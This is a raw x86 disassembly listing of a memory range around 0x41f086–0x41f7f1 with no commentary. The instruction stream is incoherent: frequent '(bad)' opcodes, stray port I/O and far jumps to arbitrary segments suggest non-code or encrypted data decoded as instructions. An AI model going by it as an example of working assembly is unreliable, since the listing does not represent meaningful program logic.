  41f086:	adc    bh,dh
  41f088:	je     0x41f035
  41f08a:	add    BYTE PTR [esi-0x699d5905],cl
  41f090:	fistp  DWORD PTR [esp+edx*8+0x22]
  41f094:	mov    DWORD PTR [ecx+eax*8-0x760a1234],eax
  41f09b:	test   al,0xd5
  41f09d:	add    BYTE PTR [edx],bl
  41f09f:	out    0xe1,al
  41f0a1:	jg     0x41f090
  41f0a3:	sub    bh,BYTE PTR [edx-0x5ab8dba1]
  41f0a9:	push   eax
  41f0aa:	dec    ebx
  41f0ab:	das    
  41f0ac:	popf   
  41f0ad:	into   
  41f0ae:	lods   al,BYTE PTR ds:[esi]
  41f0af:	and    eax,0x2b3092e9
  41f0b4:	pop    esp
  41f0b5:	inc    ebp
  41f0b6:	adc    al,0x23
  41f0b8:	mov    edx,0x22bddaf4
  41f0bd:	aam    0x67
  41f0bf:	xchg   BYTE PTR [esi-0x20f2f321],dh
  41f0c5:	fldcw  WORD PTR [esi]
  41f0c7:	jnp    0x41f118
  41f0c9:	cmp    BYTE PTR [edx-0x42],cl
  41f0cc:	call   0x31b0:0x574fe07c
  41f0d3:	jno    0x41f138
  41f0d5:	push   ds
  41f0d6:	mov    edi,0x6ba4b68c
  41f0db:	cmp    ebx,DWORD PTR [esi-0x4b72de7e]
  41f0e1:	das    
  41f0e2:	mov    ds:0x75747930,eax
  41f0e7:	fsubr  QWORD PTR [edx+0x6c]
  41f0ea:	(bad)  
  41f0eb:	adc    DWORD PTR [edx-0x70fcc3c7],ebp
  41f0f1:	outs   dx,BYTE PTR ds:[esi]
  41f0f2:	(bad)  [ecx-0xebccfeb]
  41f0f8:	xor    esp,DWORD PTR [edi+0x796d354]
  41f0fe:	sahf   
  41f0ff:	stos   BYTE PTR es:[edi],al
  41f100:	cli    
  41f101:	push   ebx
  41f102:	push   ds
  41f103:	jecxz  0x41f0d9
  41f105:	(bad)  
  41f106:	mov    esi,0x4830d441
  41f10b:	imul   eax,DWORD PTR [ebx+0x5dc81f8],0x26
  41f112:	(bad)  
  41f113:	fidiv  DWORD PTR [edi+0x29d7d9a8]
  41f119:	test   al,0x63
  41f11b:	out    dx,al
  41f11c:	ret    0x732a
  41f11f:	jae    0x41f15d
  41f121:	ins    DWORD PTR es:[edi],dx
  41f122:	mov    ds:0x9a904985,eax
  41f127:	xchg   edx,eax
  41f128:	dec    edi
  41f129:	pop    edx
  41f12a:	mov    edx,0x4c19e2ed
  41f12f:	loope  0x41f102
  41f131:	pop    edx
  41f132:	jnp    0x41f19b
  41f134:	sbb    BYTE PTR [ebx+0x25],ah
  41f137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f138:	loopne 0x41f116
  41f13a:	push   cs
  41f13b:	and    BYTE PTR [eax],0xe6
  41f13e:	xchg   esp,eax
  41f13f:	mov    ch,0xa9
  41f141:	mov    cs,edx
  41f143:	in     al,dx
  41f144:	jnp    0x41f0e2
  41f146:	add    ch,BYTE PTR [esi]
  41f148:	jge    0x41f1b8
  41f14a:	aas    
  41f14b:	in     ax,dx
  41f14d:	pop    edi
  41f14e:	mov    esi,0x27ae618a
  41f153:	push   ss
  41f154:	mov    DWORD PTR ds:0x57c011ef,ecx
  41f15a:	adc    dl,BYTE PTR [edi]
  41f15c:	arpl   WORD PTR [eax-0x5906f7b1],si
  41f162:	xchg   DWORD PTR [edi-0x31],ebx
  41f165:	push   ss
  41f166:	icebp  
  41f167:	stos   DWORD PTR es:[edi],eax
  41f168:	xchg   edx,eax
  41f169:	(bad)  
  41f16b:	je     0x41f1e0
  41f16d:	(bad)  
  41f16f:	sub    DWORD PTR [esi+0x68],ebp
  41f172:	mov    BYTE PTR [edi],cl
  41f174:	dec    esi
  41f175:	popf   
  41f176:	dec    edi
  41f177:	sub    ebx,DWORD PTR [edi]
  41f179:	popf   
  41f17a:	mov    esi,0xb9de4cc7
  41f17f:	mov    ds:0xf3a7f0da,al
  41f184:	jp     0x41f1d6
  41f186:	mov    BYTE PTR [eax-0x745225b7],bh
  41f18c:	jb     0x41f13d
  41f18e:	push   ss
  41f18f:	push   ebp
  41f190:	call   0xeda55d75
  41f195:	adc    edx,0x2333e41b
  41f19b:	xlat   BYTE PTR ds:[ebx]
  41f19c:	loope  0x41f1bd
  41f19e:	jno    0x41f135
  41f1a0:	mov    eax,ds:0x6e343208
  41f1a5:	jge    0x41f127
  41f1a7:	cmp    BYTE PTR [ebx+0x7c],0xde
  41f1ab:	add    al,cl
  41f1ad:	nop
  41f1ae:	repnz es loopne 0x41f1ed
  41f1b2:	ins    DWORD PTR es:[edi],dx
  41f1b3:	(bad)  
  41f1b4:	fcomp  st(4)
  41f1b6:	cmp    DWORD PTR [esi],eax
  41f1b8:	cmp    dl,BYTE PTR [esi-0x378cd8d1]
  41f1be:	(bad)  
  41f1bf:	xchg   edx,eax
  41f1c0:	sub    al,0xd8
  41f1c2:	sub    al,0x39
  41f1c4:	sbb    eax,0xddc17b8f
  41f1c9:	xchg   ebp,eax
  41f1ca:	push   esi
  41f1cb:	inc    ebp
  41f1cc:	lods   eax,DWORD PTR ds:[esi]
  41f1cd:	lahf   
  41f1ce:	clc    
  41f1cf:	and    al,0xd5
  41f1d1:	bound  esi,QWORD PTR [edi-0x54b828ee]
  41f1d7:	jb     0x41f1f0
  41f1d9:	push   eax
  41f1da:	(bad)  [ecx-0x41]
  41f1dd:	lahf   
  41f1de:	push   esp
  41f1df:	rcr    BYTE PTR [ecx+eiz*2],0xd0
  41f1e3:	aad    0xcb
  41f1e5:	das    
  41f1e6:	jno    0x41f183
  41f1e8:	js     0x41f256
  41f1ea:	sti    
  41f1eb:	sub    DWORD PTR [ebx-0x1a6460c8],0xaedbe877
  41f1f5:	call   0x6e64:0xdcb1cae3
  41f1fc:	dec    ebp
  41f1fd:	fild   QWORD PTR [ebx+0x5dc1907b]
  41f203:	je     0x41f225
  41f205:	xor    BYTE PTR [edx],0x78
  41f208:	push   es
  41f209:	xor    edx,esi
  41f20b:	cmc    
  41f20c:	push   ecx
  41f20d:	cmp    al,0xf8
  41f20f:	add    DWORD PTR [edx+0x10439cf7],edi
  41f215:	mov    edx,0x65b21da0
  41f21a:	sub    al,0x48
  41f21c:	cmp    eax,esp
  41f21e:	jmp    FWORD PTR [edi]
  41f220:	mov    bl,0x74
  41f222:	sub    eax,0x3bfde726
  41f227:	add    DWORD PTR [edi-0x63c5a6b7],ecx
  41f22d:	jge    0x41f2a0
  41f22f:	fadd   DWORD PTR [esi]
  41f231:	xor    eax,0xc7897152
  41f236:	scas   al,BYTE PTR es:[edi]
  41f237:	leave  
  41f238:	aam    0x60
  41f23a:	fld    QWORD PTR ds:[edi+ebp*8+0x6]
  41f23f:	and    BYTE PTR [ebp-0x39f0805e],dl
  41f245:	adc    eax,0xe008999d
  41f24a:	stos   BYTE PTR es:[edi],al
  41f24b:	sbb    cl,ch
  41f24d:	add    edx,DWORD PTR [ecx+0x36]
  41f250:	test   eax,0x75d602c4
  41f255:	cld    
  41f256:	iret   
  41f257:	jge    0x41f246
  41f259:	mov    fs,edx
  41f25b:	pop    ecx
  41f25c:	ret    0x9335
  41f25f:	call   0xcc52:0xa1335c48
  41f266:	inc    ebp
  41f267:	sbb    ebx,DWORD PTR [ecx]
  41f269:	ins    BYTE PTR es:[edi],dx
  41f26a:	add    al,bh
  41f26c:	jge    0x41f291
  41f26e:	ins    BYTE PTR es:[edi],dx
  41f26f:	aaa    
  41f270:	ins    BYTE PTR es:[edi],dx
  41f271:	add    eax,0xb049457e
  41f276:	aam    0x2a
  41f278:	push   esi
  41f279:	dec    edx
  41f27a:	fst    QWORD PTR [edi+0x240bb904]
  41f280:	xor    eax,0x51e92732
  41f285:	mul    DWORD PTR [edx+0x2d]
  41f288:	mov    edx,DWORD PTR [edi-0x73]
  41f28b:	and    DWORD PTR [ebx-0x49267c25],0xc2bcea62
  41f295:	cmp    DWORD PTR [edx+0x2],esp
  41f298:	xchg   edx,eax
  41f299:	mov    eax,ds:0xd5de418c
  41f29e:	std    
  41f29f:	sbb    DWORD PTR [ecx-0x7aabfc07],eax
  41f2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2a6:	mov    WORD PTR [ebp-0x36932210],?
  41f2ac:	mov    BYTE PTR [edi+0x8],ah
  41f2af:	jne    0x41f24a
  41f2b1:	enter  0x902d,0x73
  41f2b5:	cld    
  41f2b6:	fst    DWORD PTR [ebx]
  41f2b8:	pop    ds
  41f2b9:	out    dx,eax
  41f2ba:	mov    cl,0xac
  41f2bc:	pop    ss
  41f2bd:	adc    edi,DWORD PTR [eax+eax*4-0x2bd052ca]
  41f2c4:	push   eax
  41f2c5:	js     0x41f26a
  41f2c7:	dec    ebx
  41f2c8:	ins    BYTE PTR es:[edi],dx
  41f2c9:	data16 aad 0xb7
  41f2cc:	jp     0x41f256
  41f2ce:	popa   
  41f2cf:	loopne 0x41f2d9
  41f2d1:	out    dx,al
  41f2d2:	jl     0x41f28c
  41f2d4:	arpl   WORD PTR [eax],bx
  41f2d6:	xor    ebp,edi
  41f2d8:	mov    al,bh
  41f2da:	out    0xfd,eax
  41f2dc:	or     eax,0xc1f2261b
  41f2e1:	stos   BYTE PTR es:[edi],al
  41f2e2:	in     eax,0x6d
  41f2e4:	inc    ebp
  41f2e5:	mov    esi,ebp
  41f2e7:	lock int 0xac
  41f2ea:	push   ebx
  41f2eb:	and    esi,esp
  41f2ed:	stc    
  41f2ee:	fist   WORD PTR [eax]
  41f2f0:	loopne 0x41f34b
  41f2f2:	and    al,BYTE PTR [ecx]
  41f2f4:	in     al,dx
  41f2f5:	cdq    
  41f2f6:	int3   
  41f2f7:	add    bh,BYTE PTR [eax-0xa]
  41f2fa:	xchg   ebx,eax
  41f2fb:	punpckhwd mm6,QWORD PTR [ebp-0x30]
  41f2ff:	mov    bl,0xe4
  41f301:	out    dx,al
  41f302:	sbb    esp,0xffffffbe
  41f305:	push   cs
  41f306:	aaa    
  41f307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f308:	push   ds
  41f309:	inc    ebp
  41f30a:	fsub   QWORD PTR [eax]
  41f30c:	scas   al,BYTE PTR es:[edi]
  41f30d:	out    dx,al
  41f30e:	jl     0x41f2c9
  41f310:	mov    eax,0x3d387799
  41f315:	xchg   ecx,eax
  41f316:	je     0x41f2d4
  41f318:	adc    BYTE PTR [esi+0x33],dl
  41f31b:	mov    esi,0xf977843
  41f320:	cmp    BYTE PTR [esi-0x42],cl
  41f323:	push   0xffffffcc
  41f325:	(bad)  
  41f327:	outs   dx,DWORD PTR ds:[esi]
  41f328:	ins    DWORD PTR es:[edi],dx
  41f329:	or     al,0xee
  41f32b:	(bad)  
  41f32d:	xchg   edx,eax
  41f32e:	add    eax,0x69a91ca
  41f333:	xchg   BYTE PTR [edi+edx*2+0x2e7a5094],al
  41f33a:	fisttp DWORD PTR [edi+0x5c]
  41f33d:	mov    dl,0xaa
  41f33f:	ja     0x41f2f9
  41f341:	xchg   edi,eax
  41f342:	jo     0x41f2e3
  41f344:	dec    eax
  41f345:	jnp    0x41f307
  41f347:	push   es
  41f348:	pushf  
  41f349:	(bad)  
  41f34b:	hlt    
  41f34c:	cmc    
  41f34d:	retf   
  41f34e:	addr16 adc al,0x4d
  41f351:	sahf   
  41f352:	jb     0x41f398
  41f354:	sub    eax,0x7183bbdd
  41f359:	in     al,0x81
  41f35b:	and    eax,0x4e453052
  41f360:	out    0x7,eax
  41f362:	mov    ch,0x8e
  41f364:	mov    ds:0x56cd1aa5,eax
  41f369:	jae    0x41f30f
  41f36b:	sub    esi,esi
  41f36d:	push   es
  41f36e:	pop    ss
  41f36f:	adc    DWORD PTR [esi-0x1],0x7b
  41f373:	daa    
  41f374:	fstp   QWORD PTR [esi-0x3f]
  41f377:	out    0xef,eax
  41f379:	test   eax,0x84ed492b
  41f37e:	(bad)  
  41f37f:	popa   
  41f380:	xlat   BYTE PTR ds:[ebx]
  41f381:	lods   eax,DWORD PTR ds:[esi]
  41f382:	fs jnp 0x41f403
  41f385:	add    eax,0xa5c66550
  41f38a:	cmp    DWORD PTR [ecx-0x18],0x34
  41f38e:	sub    al,0xad
  41f390:	pop    eax
  41f391:	mov    esp,0xf9b387c3
  41f396:	scas   eax,DWORD PTR es:[edi]
  41f397:	sahf   
  41f398:	or     DWORD PTR [edi+edi*1+0x4bf5d30d],ebx
  41f39f:	push   cs
  41f3a0:	adc    ecx,DWORD PTR [ebp-0x70]
  41f3a3:	jno    0x41f35f
  41f3a5:	jo     0x41f3a9
  41f3a7:	mov    dl,0x88
  41f3a9:	lds    edi,FWORD PTR ds:0xcf4407ac
  41f3af:	ins    DWORD PTR es:[edi],dx
  41f3b0:	jmp    0x41f336
  41f3b2:	outs   dx,BYTE PTR ds:[esi]
  41f3b3:	jmp    0x41f3a6
  41f3b5:	xor    eax,0x4379e0f
  41f3ba:	lock xchg edi,eax
  41f3bc:	mov    eax,0x4cf3ebd9
  41f3c1:	fild   WORD PTR [esi-0x30]
  41f3c4:	sbb    esp,edi
  41f3c6:	js     0x41f408
  41f3c8:	pop    ds
  41f3c9:	mov    edx,DWORD PTR [ebx+0x1075044f]
  41f3cf:	(bad)  
  41f3d0:	out    dx,al
  41f3d1:	jecxz  0x41f3a0
  41f3d3:	jne    0x41f38c
  41f3d5:	test   BYTE PTR [ebp-0x32],al
  41f3d8:	mov    esi,0xd4d2694
  41f3dd:	fcomp  QWORD PTR [eax+0x29]
  41f3e0:	stos   BYTE PTR es:[edi],al
  41f3e1:	dec    edx
  41f3e2:	loopne 0x41f384
  41f3e4:	loopne 0x41f460
  41f3e6:	push   0x9bef499a
  41f3eb:	or     al,BYTE PTR [esi-0xa]
  41f3ee:	lods   eax,DWORD PTR ds:[esi]
  41f3ef:	and    ecx,DWORD PTR [esp+esi*4]
  41f3f2:	rol    DWORD PTR [ecx-0x40ba32e2],1
  41f3f8:	sub    bl,ch
  41f3fa:	and    eax,0x78701224
  41f3ff:	pop    ecx
  41f400:	sti    
  41f401:	pop    ebx
  41f402:	daa    
  41f403:	test   DWORD PTR [edx+0x43ce7068],ebp
  41f409:	mov    dh,cl
  41f40b:	out    0xbf,eax
  41f40d:	loop   0x41f3de
  41f40f:	fnstcw WORD PTR [edx]
  41f411:	shl    DWORD PTR [edx-0x5],cl
  41f414:	jl     0x41f450
  41f416:	adc    al,0x42
  41f418:	and    cl,BYTE PTR [edi]
  41f41a:	sbb    BYTE PTR [ecx],bh
  41f41c:	mov    DWORD PTR [edi-0x41a6fa34],edx
  41f422:	(bad)  
  41f423:	fst    st(1)
  41f425:	mov    eax,fs:0xe93fab83
  41f42b:	lahf   
  41f42c:	and    eax,0xd81b1035
  41f431:	adc    BYTE PTR [edx],cl
  41f433:	fsub   st,st(1)
  41f435:	sub    dl,BYTE PTR [ebx]
  41f437:	cmp    edx,DWORD PTR ds:0xe84e00f
  41f43d:	jmp    0x0:0x76
  41f444:	add    BYTE PTR [eax],al
  41f446:	add    BYTE PTR [eax],al
  41f448:	add    BYTE PTR [eax],al
  41f44a:	push   edx
  41f44b:	dec    ebp
  41f44c:	dec    esp
  41f44d:	inc    ebp
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	sahf   
  41f457:	jns    0x41f3e6
  41f459:	and    al,0xcd
  41f45b:	add    DWORD PTR [ecx],0x0
  41f45e:	jge    0x41f466
  41f460:	add    BYTE PTR [eax],al
  41f462:	or     DWORD PTR [ebx+edx*8-0x11],esi
  41f466:	call   0x7027a912
  41f46b:	loop   0x41f478
  41f46d:	test   ebp,ebx
  41f46f:	mov    ds:0xe6d5d69c,eax
  41f474:	jl     0x41f482
  41f476:	push   edx
  41f477:	shl    DWORD PTR [eax+0x7b205579],cl
  41f47d:	into   
  41f47e:	mov    ebx,0x51a54c5c
  41f483:	pop    ebx
  41f484:	pop    esi
  41f485:	xchg   esi,eax
  41f486:	test   BYTE PTR [eax],dl
  41f488:	mov    ds:0x87446947,al
  41f48d:	and    ebp,esp
  41f48f:	and    al,0x96
  41f491:	bnd jmp 0x5ad330ff
  41f497:	dec    edi
  41f498:	out    0xf9,al
  41f49a:	pop    ebx
  41f49b:	mov    ebx,esp
  41f49d:	stc    
  41f49e:	ds xor al,0xca
  41f4a1:	pop    esi
  41f4a2:	add    BYTE PTR [ebp+0x6f],0x4d
  41f4a6:	mov    ebp,0x79450ca7
  41f4ab:	mov    bh,0xa8
  41f4ad:	jmp    0x5b1b:0xd464a72e
  41f4b4:	pop    edx
  41f4b5:	cli    
  41f4b6:	dec    WORD PTR [edx]
  41f4b9:	fs cli 
  41f4bb:	imul   ebx,ebp,0xd0c1319
  41f4c1:	pop    es
  41f4c2:	sbb    dh,ch
  41f4c4:	xchg   ecx,eax
  41f4c5:	cdq    
  41f4c6:	cmc    
  41f4c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4c8:	test   al,0x5e
  41f4ca:	idiv   DWORD PTR [edi-0x34]
  41f4cd:	stc    
  41f4ce:	out    dx,eax
  41f4cf:	push   edi
  41f4d0:	stos   BYTE PTR es:[edi],al
  41f4d1:	mov    eax,ds:0x9b4e75b0
  41f4d6:	sbb    eax,0x75bf07e9
  41f4db:	mov    esi,0xd64e327
  41f4e0:	push   0x7f
  41f4e2:	inc    edi
  41f4e3:	add    DWORD PTR [ecx],0xffffff9f
  41f4e6:	mov    edi,0x4d01c475
  41f4eb:	add    edx,DWORD PTR [edx]
  41f4ed:	pop    ss
  41f4ee:	mov    ecx,0xdcf67d76
  41f4f3:	div    al
  41f4f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f6:	iret   
  41f4f7:	jmp    0x3161ee12
  41f4fc:	xchg   ebp,eax
  41f4fd:	out    0x93,eax
  41f4ff:	mov    bl,0x3c
  41f501:	jne    0x41f4db
  41f503:	jb     0x41f56f
  41f505:	jl     0x41f4aa
  41f507:	pushf  
  41f508:	xor    edx,DWORD PTR ss:[ebp+0x2e9525f4]
  41f50f:	pop    esi
  41f510:	outs   dx,BYTE PTR ds:[esi]
  41f511:	xchg   esp,eax
  41f512:	mov    edi,0xcdc597a7
  41f517:	or     BYTE PTR ss:[ebp+0x2f5f159c],dh
  41f51e:	hlt    
  41f51f:	mov    edx,ebx
  41f521:	jg     0x41f50f
  41f523:	jmp    DWORD PTR [eax+0x2cd89dfb]
  41f529:	icebp  
  41f52a:	xchg   edx,eax
  41f52b:	in     al,dx
  41f52c:	in     eax,dx
  41f52d:	inc    ecx
  41f52e:	add    esp,DWORD PTR [edx*8-0x5f464fab]
  41f535:	adc    eax,0x733f0771
  41f53a:	cmp    DWORD PTR [esi],esp
  41f53c:	iret   
  41f53d:	cmp    bl,0x28
  41f540:	cmp    DWORD PTR [ecx+0x6221df18],edx
  41f546:	std    
  41f547:	out    dx,al
  41f548:	call   0xde0f:0x44f2ff44
  41f54f:	(bad)  
  41f550:	or     al,0x30
  41f552:	push   esp
  41f553:	cld    
  41f554:	mov    WORD PTR [ecx+0x1b],ds
  41f557:	push   edx
  41f558:	add    ah,cl
  41f55a:	je     0x41f527
  41f55c:	jae    0x41f540
  41f55e:	mov    ch,0xa7
  41f560:	lock int 0x90
  41f563:	imul   ebx,DWORD PTR [edi+0x4cbc5470],0x4ebed469
  41f56d:	aam    0xba
  41f56f:	pop    es
  41f570:	xor    ch,BYTE PTR [edi]
  41f572:	std    
  41f573:	push   ecx
  41f574:	mov    ah,0xe1
  41f576:	fist   WORD PTR [ebp*8+0x655c8047]
  41f57d:	cmp    esi,edi
  41f57f:	dec    ebp
  41f580:	leave  
  41f581:	iret   
  41f582:	mov    eax,0x288e7201
  41f587:	jl     0x41f5b2
  41f589:	xchg   ecx,eax
  41f58a:	push   cs
  41f58b:	icebp  
  41f58c:	rcl    esp,0x64
  41f58f:	sti    
  41f590:	xor    dl,ch
  41f592:	xchg   ebx,eax
  41f593:	cmp    ch,BYTE PTR [edx+0x2]
  41f596:	cs push edi
  41f598:	fild   WORD PTR [esi]
  41f59a:	int    0xa9
  41f59c:	pop    ebx
  41f59d:	imul   ebx,DWORD PTR [edx-0x45],0x17
  41f5a1:	fst    QWORD PTR [ebp+0x5d]
  41f5a4:	cmp    al,BYTE PTR [eax-0x80]
  41f5a7:	xor    DWORD PTR [esi-0x50c8280d],ebx
  41f5ad:	xchg   edx,eax
  41f5ae:	pop    esp
  41f5af:	add    DWORD PTR [esi],edx
  41f5b1:	sub    al,0xa
  41f5b3:	adc    BYTE PTR [ecx-0x5bd06d7],ch
  41f5b9:	icebp  
  41f5ba:	lahf   
  41f5bb:	or     al,0xc3
  41f5bd:	inc    edi
  41f5be:	fs push 0x1c
  41f5c1:	push   0xe0d99e2
  41f5c6:	rcr    BYTE PTR [esi],1
  41f5c8:	push   ds
  41f5c9:	add    BYTE PTR [eax],cl
  41f5cb:	mov    ebp,0xbb67fcba
  41f5d0:	(bad)  
  41f5d1:	fisttp DWORD PTR [ebx+ebx*8]
  41f5d4:	popf   
  41f5d5:	pop    ss
  41f5d6:	and    al,0xa1
  41f5d8:	out    0x15,al
  41f5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5db:	rcr    BYTE PTR [ebp-0x77953693],cl
  41f5e1:	xchg   esp,eax
  41f5e2:	dec    eax
  41f5e3:	(bad)  
  41f5e4:	(bad)  
  41f5e5:	jne    0x41f5b6
  41f5e7:	add    DWORD PTR [edx],eax
  41f5e9:	pop    ss
  41f5ea:	xor    BYTE PTR [ecx+edi*4],dh
  41f5ed:	repnz sub cl,BYTE PTR [eax-0x35]
  41f5f1:	sbb    al,0xfd
  41f5f3:	(bad)  
  41f5f4:	loopne 0x41f605
  41f5f6:	mov    edi,0xeb9d3d8b
  41f5fb:	pop    edx
  41f5fc:	lods   eax,DWORD PTR ds:[esi]
  41f5fd:	push   esi
  41f5fe:	mov    edx,0x97f2df38
  41f603:	mov    edi,DWORD PTR [esi]
  41f605:	xchg   ecx,eax
  41f606:	fstp   QWORD PTR [esi-0x37]
  41f609:	fnsave [edi-0x16]
  41f60c:	inc    BYTE PTR [edi-0x64]
  41f60f:	push   0x8def11ec
  41f614:	vmovlpd xmm2,xmm3,QWORD PTR [esi+0x2e5b1bc3]
  41f61c:	inc    esi
  41f61d:	sbb    esi,DWORD PTR ds:0xefd14698
  41f623:	mov    ecx,DWORD PTR [ebx-0x15]
  41f626:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f628:	dec    esi
  41f629:	add    ebp,edx
  41f62b:	xlat   BYTE PTR ds:[ebx]
  41f62c:	or     ecx,DWORD PTR [ebx]
  41f62e:	retf   0x6947
  41f631:	fiadd  DWORD PTR [ebp-0x68]
  41f634:	xor    ah,al
  41f636:	outs   dx,BYTE PTR ds:[esi]
  41f637:	fst    st(3)
  41f639:	mov    ?,WORD PTR [ebp-0x7f]
  41f63c:	sahf   
  41f63d:	sub    DWORD PTR [eax-0x1e1bd4cd],edi
  41f643:	mov    ecx,0xe49e46a1
  41f648:	push   ecx
  41f649:	pop    esp
  41f64a:	xchg   bh,bh
  41f64c:	fld    TBYTE PTR [esi-0x32]
  41f64f:	dec    edi
  41f650:	jecxz  0x41f625
  41f652:	std    
  41f653:	in     eax,0xce
  41f655:	inc    ecx
  41f656:	mov    bh,0xed
  41f658:	std    
  41f659:	jmp    0x41f693
  41f65b:	mov    esi,0xadbc0321
  41f660:	in     eax,dx
  41f661:	stc    
  41f662:	sbb    BYTE PTR [ebx+0x0],0xbf
  41f666:	lds    ecx,FWORD PTR [esi+eax*1+0x335f58dc]
  41f66d:	fucomi st,st(7)
  41f66f:	je     0x41f6ba
  41f671:	sbb    BYTE PTR [ecx+0x55],0xc4
  41f675:	(bad)  
  41f676:	xor    edx,0x8c8343de
  41f67c:	out    0x19,al
  41f67e:	or     al,0xbe
  41f680:	fucomp st(0)
  41f682:	fimul  WORD PTR [eax-0x71]
  41f685:	mov    esi,edx
  41f687:	sub    DWORD PTR [esi+ecx*1],edi
  41f68a:	and    DWORD PTR [edi+esi*2+0x41],0x3f07d5c6
  41f692:	push   ds
  41f693:	xchg   ebp,eax
  41f694:	hlt    
  41f695:	jae    0x41f61a
  41f697:	adc    BYTE PTR [edx],0x43
  41f69a:	adc    ah,ah
  41f69c:	sbb    al,ah
  41f69e:	ja     0x41f6f5
  41f6a0:	inc    ebx
  41f6a1:	mov    eax,0xb97e7a2
  41f6a6:	xor    eax,0xdc346067
  41f6ab:	rcl    ah,1
  41f6ad:	push   cs
  41f6ae:	or     ecx,DWORD PTR [eax-0x60f0ca2b]
  41f6b4:	retf   0xe114
  41f6b7:	mov    al,0x8f
  41f6b9:	cmc    
  41f6ba:	mov    BYTE PTR [edi+eax*1],dl
  41f6bd:	in     al,0x2a
  41f6bf:	fst    QWORD PTR [esi-0x12]
  41f6c2:	cli    
  41f6c3:	mov    ds:0x757e75f6,al
  41f6c8:	push   esp
  41f6c9:	pop    es
  41f6ca:	cmp    ecx,DWORD PTR [eax-0x2bf38659]
  41f6d0:	(bad)  
  41f6d2:	repnz retf 
  41f6d4:	loope  0x41f65c
  41f6d6:	mov    eax,ds:0x9ec41055
  41f6db:	add    eax,0xe735667f
  41f6e0:	add    ah,BYTE PTR [esp+eax*2+0x59]
  41f6e4:	xchg   DWORD PTR [esi-0x6b460c54],edx
  41f6ea:	stos   DWORD PTR es:[edi],eax
  41f6eb:	js     0x41f722
  41f6ed:	repnz popf 
  41f6ef:	sbb    cl,ah
  41f6f1:	mov    ds:0x27e90b12,eax
  41f6f6:	(bad)  
  41f6f7:	jecxz  0x41f6e2
  41f6f9:	lds    ebx,FWORD PTR [edi]
  41f6fb:	mov    ds:0xa62a0cde,eax
  41f700:	ins    DWORD PTR es:[edi],dx
  41f701:	sub    esi,DWORD PTR [esi+0x45c61388]
  41f707:	outs   dx,DWORD PTR ds:[esi]
  41f708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f709:	call   FWORD PTR [ebp+0x187b34ee]
  41f70f:	or     al,0x2a
  41f711:	icebp  
  41f712:	sbb    DWORD PTR [ecx],0x65
  41f715:	rcl    edi,1
  41f717:	fisubr DWORD PTR [edx]
  41f719:	cmp    al,0x65
  41f71b:	ss aad 0x1d
  41f71e:	vmwrite ecx,DWORD PTR [esi-0x345b5849]
  41f725:	mov    ebx,0xfe2013a5
  41f72a:	hlt    
  41f72b:	xor    al,0x42
  41f72d:	idiv   edx
  41f72f:	mov    BYTE PTR ds:0xce68c8a5,ch
  41f735:	inc    eax
  41f736:	push   0xe8d710e7
  41f73b:	xor    DWORD PTR [edi+0x1ab831be],esp
  41f741:	retf   
  41f742:	(bad)  
  41f743:	cmp    al,0x1d
  41f745:	dec    esp
  41f746:	loopne 0x41f74d
  41f748:	dec    BYTE PTR [ebx]
  41f74a:	cwde   
  41f74b:	and    eax,0xefec3d30
  41f750:	mov    edi,0x6456b53b
  41f755:	xchg   esi,eax
  41f756:	pop    ds
  41f757:	jmp    0x55c:0x3aaaf9fc
  41f75e:	rcr    BYTE PTR ds:0x48545d7a,0x6d
  41f765:	push   edx
  41f766:	sar    BYTE PTR [eax],cl
  41f768:	mov    bl,0xae
  41f76a:	dec    ecx
  41f76b:	(bad)  
  41f76c:	pop    ebx
  41f76d:	jno    0x41f788
  41f76f:	icebp  
  41f770:	jne    0x41f7b7
  41f772:	in     al,dx
  41f773:	loopne 0x41f79f
  41f775:	lahf   
  41f776:	jmp    0xaf47:0x49aa7551
  41f77d:	clc    
  41f77e:	aas    
  41f77f:	xor    eax,0x62195301
  41f784:	and    ebx,ebp
  41f786:	shr    BYTE PTR [eax+0x26],1
  41f789:	cmc    
  41f78a:	out    dx,eax
  41f78b:	gs loop 0x41f7a9
  41f78e:	test   eax,0x925aa46b
  41f793:	das    
  41f794:	mov    ds:0xb198b468,al
  41f799:	sti    
  41f79a:	inc    eax
  41f79b:	imul   esp,DWORD PTR [ebx-0x27],0xb0fa3d45
  41f7a2:	gs jle 0x41f739
  41f7a5:	mov    cl,0x24
  41f7a7:	cld    
  41f7a8:	(bad)  
  41f7a9:	fsub   QWORD PTR [ecx-0x68]
  41f7ac:	dec    esi
  41f7ad:	out    0x42,al
  41f7af:	es in  al,0x4e
  41f7b2:	scas   al,BYTE PTR es:[edi]
  41f7b3:	(bad)  
  41f7b4:	out    0xa4,eax
  41f7b6:	stos   BYTE PTR es:[edi],al
  41f7b7:	dec    ebx
  41f7b8:	cmp    BYTE PTR [esi],al
  41f7ba:	js     0x41f806
  41f7bc:	das    
  41f7bd:	fucom  st(0)
  41f7bf:	mov    cl,0xcb
  41f7c1:	xchg   esp,eax
  41f7c2:	jb     0x41f83b
  41f7c4:	inc    esp
  41f7c5:	adc    ch,BYTE PTR [ecx-0x63]
  41f7c8:	jnp    0x41f762
  41f7ca:	addr16 sub edi,ebx
  41f7cd:	fs push edi
  41f7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d0:	cmp    al,0xec
  41f7d2:	pop    edx
  41f7d3:	cmp    al,0x8e
  41f7d5:	mov    ebp,0x7cb4ea32
  41f7da:	xor    al,0xea
  41f7dc:	mov    bh,0x96
  41f7de:	cmp    al,0xb4
  41f7e0:	stos   DWORD PTR es:[edi],eax
  41f7e1:	pop    edi
  41f7e2:	cwde   
  41f7e3:	mov    bl,BYTE PTR [ebx]
  41f7e5:	imul   ebx,eax,0x1bebde77
  41f7eb:	xchg   edx,eax
  41f7ec:	xor    al,0x12
  41f7ee:	add    cl,BYTE PTR [ecx+0x2f]
  41f7f1:	pop    esi
